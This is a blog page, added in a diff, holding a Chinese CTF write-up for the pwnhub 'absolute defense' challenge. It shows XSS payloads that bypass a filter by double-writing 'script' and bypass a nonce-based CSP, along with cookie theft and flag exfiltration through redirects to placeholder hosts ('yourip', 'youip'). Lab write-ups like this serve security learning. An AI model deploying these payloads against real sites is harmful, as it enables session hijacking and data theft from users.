@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>胖哈勃破處﹣绝对防御 - Virink's Blog</title>
+  <meta name="author" content="Virink">
+  <meta name="keywords" content="Virink,技术博客,CTF,Writeup,代码审计,AUDIT,ctf,pwnhub,writeups">
+  <meta name="description" content="Virink的小站,记录杂文与分享一些技术文章">
+  <!-- css files -->
+  <link href="/static/css/default.min.css" rel="stylesheet">
+  
+<link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
+  <!-- favicon icon files -->
+  <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+  <link rel="icon" href="/static/img/favicon.ico">
+  <!-- rss atom file -->
+  <link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <!-- Chrome 食用最佳，本主题于Chrome下开发，不适配其他浏览器 -->
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="header">
+        <img src="/static/img/logo.png" alt="Virink's Blog logo" />
+        <p ><a href="/" class="title">Virink's Blog</a></p>
+        <p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p>
+      </div>
+      <!-- Social -->
+      <!-- Social -->
+<div class="social">
+  <!-- RSS Atom -->
+  <li class="social__item">
+    <a href="https://www.virzz.com/atom.xml" title="Virink's RSS">
+      <i class='fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li><!-- Github -->
+  <li class="social__item">
+    <a href="https://github.com/virink" title="Virink's GitHub">
+      <i class='fa fa-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li><!-- Twitter -->
+  <li class="social__item">
+    <a href="https://twitter.com/virinkz" title="Virink's Twitter">
+      <i class='fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li><!-- Telegram -->
+  <li class="social__item">
+    <a href="https://telegram.me/virink" title="Virink's Telegram">
+      <i class='fa fa-paper-plane'></i>
+      <span class="label">Telegram</span>
+    </a>
+  </li></div>
+      <!-- Nav -->
+      <nav>
+          <li><a href="/">首页</a></li>
+          <li><a href="/tags">标签</a></li>
+          <li><a href="/archives">归档</a></li>
+          <li><a href="/links">友链</a></li>
+      </nav>
+    </header>
+
+    <!-- Main panel -->
+    <div class="content">
+    
+    <div class="content-wrap">
+        <article class="article animated fadeIn">
+            <div class="article-title">
+                <i class="fa fa-book"></i>&nbsp;<a href="/2017/04/22/pwnhub_writeups_absolute_defense.html">胖哈勃破處﹣绝对防御</a>
+            </div>
+            <div class="article-tag">
+                
+                <div class="article-tag-item">
+                    <a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/pwnhub/"><i class="fa fa-tag"></i>pwnhub</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a>
+                </div>
+                
+            </div>
+            <div class="article-meta">
+                <div class="article-date">
+                    <i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-04-22 00:55:51">2017-04-22 00:55:51</time>
+                </div>
+            </div>
+            <!-- <div class="clearfix"></div> -->
+            <section class="article-content markdown-body">
+                <h2>题目介绍</h2>
+<p>admin 刚刚完成了聊天版，会经常和大家聊天。</p>
+<p>http://52.80.63.91/</p>
+<h2>Get Cookie</h2>
+<pre><code>Content-Security-Policy:
+default-src 'self';
+script-src 'self' 'unsafe-inline' 'unsafe-eval';
+style-src 'self' 'unsafe-inline';
+</code></pre>
+<p>CSP有點叼，而且還有個替換過濾</p>
+<pre><code>'script' -&gt; ''
+...
+</code></pre>
+<p>這個過濾用簡單的雙寫繞過，scrscriptipt</p>
+<pre><code>payload = """&lt;scrscriptipt&gt;window.locatioonn="%s?cookie="+escape(document.cookie)&lt;/scrscriptipt&gt;""" % (xssplatform)
+</code></pre>
+<p>每次的cookie都是不一樣的</p>
+<pre><code>PHPSESSID=bgvo176v0fb7k0ur6ntiughn27
+</code></pre>
+<p>偽造admin的cookie查看信息第一條就是下一關的提示</p>
+<pre><code>Wow, good guys,maybe you want /adminshigesha233e3333#admin
+</code></pre>
+<p>訪問這個頁面，發現又是一個XSS</p>
+<h2>Get Flag</h2>
+<h3>查看源碼</h3>
+<pre><code>&lt;script nonce='nuU6doJNE09y'&gt;document.write('Hello,' + unescape(location.hash.substring(1)) + '\r\n maybe something in flag.php')&lt;/script&gt;&lt;script nonce='nuU6doJNE09y'&gt;console.log('bad boy!!')&lt;/script&gt;
+</code></pre>
+<p>兩個<code>script</code>標籤</p>
+<h3>查看響應頭</h3>
+<pre><code>Content-Security-Policy:
+default-src 'self'; script-src 'nonce-nuU6doJNE09y';
+</code></pre>
+<p>這就尷尬了，有點頭疼啊</p>
+<p>balabala~~</p>
+<p>各種測試無果，後來靈機一動<strong>元素審查</strong></p>
+<p><img alt="" src="//virzz-img.dongzt.cn/58fa42605b86b43aff000000.png" /></p>
+<p>可以發現<code>document.write</code>的內容是在第二個標籤前面，那麼是否可以利用一下</p>
+<p>寫出一個不閉合的標籤讓它和第二個標籤結合起來</p>
+<pre><code>http://52.80.63.91/adminshigesha233e3333/#&lt;script
+http://52.80.63.91/adminshigesha233e3333/#&lt;script src='//youip/payload.js'
+</code></pre>
+<p><img alt="" src="//virzz-img.dongzt.cn/58fa44435b86b43aff000001.png" /></p>
+<p><img alt="" src="//virzz-img.dongzt.cn/58fa44a45b86b43aff000002.png" /></p>
+<p>這個時候你就可以為所欲為了</p>
+<h2>Poc</h2>
+<p><strong>fuck.py</strong></p>
+<pre><code>payload_1 = "&lt;scrscriptipt&gt;window.locatioonn=\"%s?cookie=\"+escape(document.cookie)&lt;/scrscriptipt&gt;" % (xssplatform)
+
+payload_2 = "&lt;scrscriptipt&gt;window.locatioonn=\"/adminshigesha233e3333/#&lt;scrscriptipt src='%s'\"&lt;/scrscriptipt&gt;" % (xsspayload)
+</code></pre>
+<p><strong>xss.js</strong></p>
+<pre><code>// 這裡我偷個懶，直接在jquery.min.js後面加上payload
+$.get("/adminshigesha233e3333/flag.php",
+    function (res) {
+        window.location="//yourip/getxss.php?flag="+escape(res)
+    }
+});
+</code></pre>
+<h3>Flag</h3>
+<p>pwnhub{flag:%u5411%u5927%u4F6C%u4F4E%u5934%u7684.avi}</p>
+<p><strong>pwnhub{flag:向大佬低头的.avi}</strong></p>
+            </section>
+            <div class="article-copyright">
+              <span>本文标题&nbsp;:&nbsp;</span><a href="/2017/04/22/pwnhub_writeups_absolute_defense.html" target="_blank">胖哈勃破處﹣绝对防御</a><br />
+              <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
+              <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-04-22 00:55:51">2017-04-22 00:55:51</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:44:04">2017-06-01 23:44:04</time><br />
+              <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2017/04/22/pwnhub_writeups_absolute_defense.html" title="胖哈勃破處﹣绝对防御" target="_blank">https://www.virzz.com/2017/04/22/pwnhub_writeups_absolute_defense.html</a><br />
+              <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
+              <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
+            </div>
+        </article>
+        <!-- <div class="toc" data-toc="h2,h3,h4,h5,h6"></div> -->
+        <div class="toc" data-toc="h2" data-tocContainer="section"></div>
+    </div>
+
+    </div>
+
+    <!-- Footer Panel -->
+    <footer class="footer">
+      <center>
+        <span class="footer__copyright">&copy; 2018-2019. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">concise</a></span>
+        <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+        </center>
+    </footer>
+
+  </div>
+  <!-- js files -->
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script>
+<script src="/static/js/toc.min.js"></script>
+<script>
+    $(document).ready(function(){
+        // highlight
+        $('code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+        // MathJax
+        MathJax.Hub.Config({ 
+            tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+        });
+    });
+</script>
+
+  <!-- Analytics Google -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-83885261-1');
+</script>
+<!-- Analytics Baidu -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
